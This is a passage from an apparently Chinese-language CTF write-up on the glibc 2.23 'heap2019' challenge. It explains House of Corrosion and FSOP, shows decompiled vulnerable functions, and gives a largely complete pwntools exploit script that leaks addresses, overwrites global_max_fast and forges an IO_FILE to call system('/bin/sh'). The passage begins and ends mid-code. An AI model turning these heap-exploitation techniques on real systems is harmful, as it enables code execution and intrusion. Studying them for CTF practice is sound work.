class="hljs-string">&#x27;./flag\0&#x27;</span><br>])<br><br>edit(<span class="hljs-number">6</span>, payload)<br><br><br>pi()<br></code></pre></td></tr></table></figure><h2 id="5-2023-heap2019"><a href="#5-2023-heap2019" class="headerlink" title="5. 2023_heap2019"></a>5. 2023_heap2019</h2><p><strong>版本：2.23-0ubuntu11.3_amd64</strong></p><p><code>/home/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so</code></p><p><code>/home/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so</code></p><h3 id="House-of-corrosion"><a href="#House-of-corrosion" class="headerlink" title="House of corrosion"></a>House of corrosion</h3><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p><code>global_max_fast</code>：用来储存 fastbin 链表能够储存的最大大小，其默认值为 0x80</p><p><code>fastbinsY</code> ：储存 fastbin 不同大小链表头指针的一段空间，为大小从 0x20 开始的 fastbin 链表预留了十个指针</p><p>通过漏洞修改global_max_fast为一个大值，造成 fastbinsY 数组溢出，后续malloc和free的堆块都属于fastbin</p><p>如果有 SIZE 超过 0xB0 的堆块，那么这个堆块计算得到的索引值就会超出 fastbinsY 的最大范围，造成数组越界。</p><p>我们可以使用以下公式来计算出目标溢出位置，对应的需要构造的堆块 SIZE。</p><p>delta 指的是溢出位置到 fastbinsY 首地址的差值</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chunksize</span>= (delta * <span class="hljs-number">2</span>) + <span class="hljs-number">0</span>x20<br></code></pre></td></tr></table></figure><h4 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h4><p><strong>核心思想是改global_max_fast为一个大数，之后释放的大堆块，可以进入fastbin</strong></p><ol><li>fastbin_ptr指向main_arena+8(libc-2.23)，libc-2.27及以上指向main_arna+0x10</li><li>fastbin_ptr中存放了各大小fastbin的fd指针，指向各fastbin链表的首个堆块地址，修改global_max_fast后，释放大堆块可以进入fastbin</li><li>通过malloc一个特定size的chunk，篡改global_max_fast，free掉这个堆块，触发攻击</li><li>实现在向一个 libc 地址中写入刚刚申请的堆地址</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">fastbin_ptr = libc_base + libc.symbols[<span class="hljs-string">&#x27;main_arena&#x27;</span>] + <span class="hljs-number">8</span> (<span class="hljs-number">0x10</span>)<br>index = (target_addr - fastbin_ptr) / <span class="hljs-number">8</span><br>size = index*<span class="hljs-number">0x10</span> + <span class="hljs-number">0x20</span><br>malloc(size)<br></code></pre></td></tr></table></figure><p>堆块中若是伪造的IO流，当后续触发libc时，就会实现IO</p><h4 id="后续利用："><a href="#后续利用：" class="headerlink" title="后续利用："></a>后续利用：</h4><p><strong>IO_FILE attack：</strong>覆写<code>_IO_list_all</code>，使其指向伪造的结构体，或者伪造._chain指向的结构体来实现任意读写，或者伪造vtable（libc-2.23）进行任意写</p><p>打free_hook函数：（__malloc_hook与__realloc_hook在main_arena的上方），从而getshell</p><p>改stdout来泄露相关信息，也可以不改_flags</p><p>假设有漏洞可以修改一个堆块的size，那么可以构造_IO_read_end等于_IO_write_base来进行绕过，具体方式是：改了global_max_fast后，先释放一个需要泄露其中内容的fake fast bin到_IO_read_end（此时，正常走IO指针的输出均会失效，因为过不了_IO_read_end &#x3D; _IO_write_base的判断，就不会执行_IO_SYSWRITE），然后修改该fake fast bin的size，再将其释放到_IO_write_base处即可。</p><p>泄露libc，在算index的时候，libc_base是被抵消掉的，是可以泄露在fastbinsY之后的数据。</p><p>思想是：当free时，会把此堆块置入fastbin链表的头部，所以在free后，此堆块的fd位置的内容，就是free前此SIZE的链表头部指针，通过越界就可以读取LIBC上某个位置的内容。</p><h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>通过劫持<code>_IO_list_all</code>的<code>_chain</code>，绕过各个检测，从而指向我们伪造的<code>IO_FILE</code>，利用以下方法触发IO流实现攻击</p><ol><li>当libc执行abort流程时</li><li>当执行exit函数时</li><li>当执行流从main函数返回时</li></ol><p><strong>libc2.23</strong></p><p><code>_IO_new_file_overflow</code>，因此在<code>libc-2.23</code>版本下可如下构造，进行<code>FSOP</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">._chain =&gt; chunk_addr<br>chunk_addr<br>&#123;<br>  file = &#123;<br>    _flags = <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>, <span class="hljs-comment">//对应此结构体首地址(fp)</span><br>    _IO_read_ptr = <span class="hljs-number">0x0</span>,<br>    _IO_read_end = <span class="hljs-number">0x0</span>,<br>    _IO_read_base = <span class="hljs-number">0x0</span>,<br>    _IO_write_base = <span class="hljs-number">0x0</span>,<br>    _IO_write_ptr = <span class="hljs-number">0x1</span>,<br>      ...<br>      _mode = <span class="hljs-number">0x0</span>, <span class="hljs-comment">//一般不用特意设置</span><br>      _unused2 = <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats <span class="hljs-number">19</span> times&gt;<br>  &#125;,<br>  vtable = heap_addr<br>  vtable+<span class="hljs-number">0x18</span> = system_addr<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">heap_addr</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">  __dummy = 0x0,</span><br><span class="hljs-comment">  __dummy2 = 0x0,</span><br><span class="hljs-comment">  __finish = 0x0,</span><br><span class="hljs-comment">  __overflow = system_addr,</span><br><span class="hljs-comment">    ...</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p><strong>main</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>      &#123;<br>        menu();<br>        _isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;v3);<br>        <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">3</span> )<br>          <span class="hljs-keyword">break</span>;<br>        Delete(); <span class="hljs-comment">//没有问题</span><br>      &#125;<br>      <span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">3</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">1</span> )<br>      &#123;<br>        Add(); <span class="hljs-comment">//malloc第6块chunk时，存在UAF，会自动free掉 (这点没啥用)</span><br>             <span class="hljs-comment">//正常add的同时，会输出值 (泄露libc和heap_base)</span><br>             <span class="hljs-comment">//大小：0x91 -- 0x2333</span><br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">2</span> )<br>      &#123;<br>        Edit(); <span class="hljs-comment">//修改Bss段上的内容，存在溢出，可以进行任意地址写入0xdeadbeef</span><br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4</span> )<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">2019</span> )<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, &amp;qword_202040); <span class="hljs-comment">//泄露elf_base，没用</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Add</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">Add</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+8h] [rbp-18h] BYREF</span><br>  <span class="hljs-type">int</span> size_4; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  <span class="hljs-type">void</span> *buf; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Content length:&quot;</span>);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;size);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sub_A00(size) )<br>  &#123;<br>    buf = <span class="hljs-built_in">malloc</span>(size);<br>    <span class="hljs-keyword">for</span> ( size_4 = <span class="hljs-number">0</span>; size_4 &lt;= <span class="hljs-number">4</span>; ++size_4 )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !heap[size_4] )<br>      &#123;<br>        heap[size_4] = buf;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Content:&quot;</span>);<br>        read(<span class="hljs-number">0</span>, buf, size);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Data is:&quot;</span>);<br>        <span class="hljs-built_in">puts</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)buf);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Add OK&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( size_4 == <span class="hljs-number">5</span> )<br>    &#123;<br>      <span class="hljs-built_in">free</span>(buf);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Too many chunks&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid size&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>edit</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">Edit</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br>  _QWORD *v2; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You cannot edit chunk but you can edit comment&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Comment:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x28</span>uLL);    <span class="hljs-comment">//溢出</span><br>  qword_2020E0 = buf[<span class="hljs-number">0</span>];<br>  qword_2020E8 = buf[<span class="hljs-number">1</span>];<br>  qword_2020F0 = buf[<span class="hljs-number">2</span>];<br>  qword_2020F8 = buf[<span class="hljs-number">3</span>];<br>  qword_202100 = (__int64)v2; <span class="hljs-comment">//任意地址写0xdeadbeef</span><br>  *v2 = <span class="hljs-string">&#x27;\xDE\xAD\xBE\xEF&#x27;</span>; <br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Edit OK&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><ol><li>可以申请large bin chunk，可以直接泄露Libc_base 和 heap_base</li><li>程序存在一个任意地址改为0xdeadbeef</li><li>利用House of corrsion手法</li><li>计算堆块地址偏移，伪造IO：libc版本为2.23，可以劫持vtables，malloc出chunk</li><li>改global_max_fast</li><li>free该chunk，触发攻击</li><li>执行exit，触发IO流</li></ol><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="hljs-comment">#context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./heap2019&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><span class="hljs-comment">#------------------------ menu  ----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>ru(<span class="hljs-string">&#x27;4.exit\n&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,con=p64(<span class="hljs-params"><span class="hljs-number">0xdeadbeef</span></span>)</span>):<br>menu(<span class="hljs-number">1</span>)<br>sla(<span class="hljs-string">b&#x27;length:&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>sa(<span class="hljs-string">b&#x27;Content:&#x27;</span>, con)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">BUG</span>(<span class="hljs-params">size</span>):<br>menu(<span class="hljs-number">1</span>)<br>sla(<span class="hljs-string">b&#x27;length:&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">addr</span>):<br>menu(<span class="hljs-number">2</span>)<br>sla(<span class="hljs-string">b&#x27;Comment:&#x27;</span>, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> + p64(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">3</span>)<br>sla(<span class="hljs-string">b&#x27;id:&#x27;</span> , <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>menu(<span class="hljs-number">4</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>():<br>    menu(<span class="hljs-number">2019</span>)<br><br><span class="hljs-comment">#------------------------  libc &amp; heap  ----------------------------</span><br>add(<span class="hljs-number">0xa28</span>, <span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x98</span>, <span class="hljs-string">&#x27;a&#x27;</span>)  <span class="hljs-comment">#1</span><br><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x200</span>, <span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#0</span><br>libc_base = uu64() - <span class="hljs-number">1345</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><br>add(<span class="hljs-number">0x418</span>,  <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xF</span> + <span class="hljs-string">b&#x27;b&#x27;</span>) <span class="hljs-comment">#2</span><br>p.recvuntil(<span class="hljs-string">&#x27;b&#x27;</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">0x210</span><br><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">0</span>)<br><br>backdoor()<br>elf_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x40</span><br><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;elf_base&#x27;</span>)<br><br>add(<span class="hljs-number">0x108</span> , <span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span> * <span class="hljs-built_in">int</span>(<span class="hljs-number">0x108</span>/<span class="hljs-number">8</span>) )<br><br><span class="hljs-comment">#------------------------  House of corrsion + FSOP  ----------------------------</span><br><span class="hljs-comment">#Gadget</span><br>fastbin_ptr = libc_base + <span class="hljs-number">0x3C4B28</span>  <span class="hljs-comment">#libc.sym[&#x27;main_arena&#x27;] + 8</span><br>global_max_fast = libc_base + <span class="hljs-number">0x3c67F8</span> <span class="hljs-comment">#p &amp;global_max_fast</span><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x7f2ecfa21620 &lt;_IO_2_1_stdout_&gt;:0x00000000fbad28870x00007f2ecfa216a3</span><br><span class="hljs-string">0x7f2ecfa21630 &lt;_IO_2_1_stdout_+16&gt;:0x00007f2ecfa216a30x00007f2ecfa216a3</span><br><span class="hljs-string">0x7f2ecfa21640 &lt;_IO_2_1_stdout_+32&gt;:0x00007f2ecfa216a30x00007f2ecfa216a3</span><br><span class="hljs-string">0x7f2ecfa21650 &lt;_IO_2_1_stdout_+48&gt;:0x00007f2ecfa216a30x00007f2ecfa216a3</span><br><span class="hljs-string">0x7f2ecfa21660 &lt;_IO_2_1_stdout_+64&gt;:0x00007f2ecfa216a40x0000000000000000</span><br><span class="hljs-string">0x7f2ecfa21670 &lt;_IO_2_1_stdout_+80&gt;:0x00000000000000000x0000000000000000</span><br><span class="hljs-string">0x7f2ecfa21680 &lt;_IO_2_1_stdout_+96&gt;:0x00000000000000000x00007f2ecfa208e0 #_chain</span><br><span class="hljs-string">0x7f2ecfa21690 &lt;_IO_2_1_stdout_+112&gt;:0x00000000000000010xffffffffffffffff</span><br><span class="hljs-string">0x7f2ecfa216a0 &lt;_IO_2_1_stdout_+128&gt;:0x000000000a0000000x00007f2ecfa22780</span><br><span class="hljs-string">0x7f2ecfa216b0 &lt;_IO_2_1_stdout_+144&gt;:0xffffffffffffffff0x0000000000000000</span><br><span class="hljs-string">0x7f2ecfa216c0 &lt;_IO_2_1_stdout_+160&gt;:0x00007f2ecfa207a00x0000000000000000</span><br><span class="hljs-string">0x7f2ecfa216d0 &lt;_IO_2_1_stdout_+176&gt;:0x00000000000000000x0000000000000000</span><br><span class="hljs-string">0x7f2ecfa216e0 &lt;_IO_2_1_stdout_+192&gt;:0x00000000ffffffff0x0000000000000000</span><br><span class="hljs-string">0x7f2ecfa216f0 &lt;_IO_2_1_stdout_+208&gt;:0x00000000000000000x00007f2ecfa1f6e0 #vtable</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>_chain = libc_base + <span class="hljs-number">0x3c5688</span> <br>vtable = libc_base + <span class="hljs-number">0x3c56f8</span><br>lg(<span class="hljs-string">&#x27;_chain&#x27;</span>)<br><br><span class="hljs-comment">#set _chain --&gt; fake_IO</span><br>target = _chain-<span class="hljs-number">0x8</span><br>index = (target - fastbin_ptr)/<span class="hljs-number">8</span><br>size = index*<span class="hljs-number">0x10</span>+<span class="hljs-number">0x20</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(size)))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_fake_file</span>(<span class="hljs-params"> addr, rdx, _wide_data , vtable</span>):<br>    <span class="hljs-comment">#flag = 0xFBAD2887</span><br>    <span class="hljs-comment">#fake_file = p64(flag)  # _flags</span><br>    <span class="hljs-comment">#fake_file += p64(addr)  # _IO_read_ptr</span><br>    fake_file = <span class="hljs-string">b&quot;&quot;</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_read_end</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_read_base</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_write_base</span><br>    fake_file += p64(addr + <span class="hljs-number">1</span>)  <span class="hljs-comment"># _IO_write_ptr</span><br>    fake_file += p64(rdx)  <span class="hljs-comment"># _IO_write_end</span><br>    fake_file += p64(addr)  <span class="hljs-comment"># _IO_buf_base</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_end</span><br>    fake_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 